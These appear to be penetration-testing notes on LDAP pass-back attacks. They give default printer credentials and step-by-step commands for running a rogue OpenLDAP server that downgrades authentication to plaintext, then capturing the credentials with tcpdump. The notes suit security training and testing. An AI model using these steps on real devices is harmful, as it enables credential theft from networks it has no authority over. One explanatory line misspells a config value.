# LDAP
`389` - Default Port

## Pass-back Attacks
Occurs when you gain access to a device configuration where LDAP parameters are specified. An example would be the web interface of a network printer. Default credentials are `admin:admin` or `admin:password`. 

If you can change the ip or hostname to an LDAP server under your control you can capture the credentials.


## Hosting a Rogue LDAP Server
A device will try to negotiate the most secure LDAP authentication method. By creating a Rogue LDAP server we can ensure this method is weak.

1. Install OpenLDAP
```sh
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

2. Reconfigure 
```sh
sudo dpkg-reconfigure -p low slapd
```

3. Omit OpenLDAP server configuration? - No
4. DNS domain name - target domain
5. Organization DN - target domain
6. Setup administrator credentials
7. Select MDB
8. Database purge ? - No
9. Move old database - Yes
10. Downgrade the authentication to ensure the server only supports `PLAIN` and `LOGIN` authentication methods.

olcSaslSecProps.ldif
```sh
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

`olcSaslSecProps` - Specifies the SASL security properties.
`nonanonymous` - Disables mechanisms that support anonymous login.
`minssf` - Minimum acceptable security strength with 0 is no protection.

11. Patch our LDAP server:
```sh
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```
12. Verify configuration
```sh
ldapsearch -H ldap:// -x -LLL -s base -b ""
```
13. Try to get the device to connect to the ldap server. If you see "Connection failed: The distinguished name contains invalid syntax." Then you have succeeded.
14. Use `tcpdump` to capture the credentials
```sh
sudo tcpdump -SX -i MyInterface tcp port 389
```
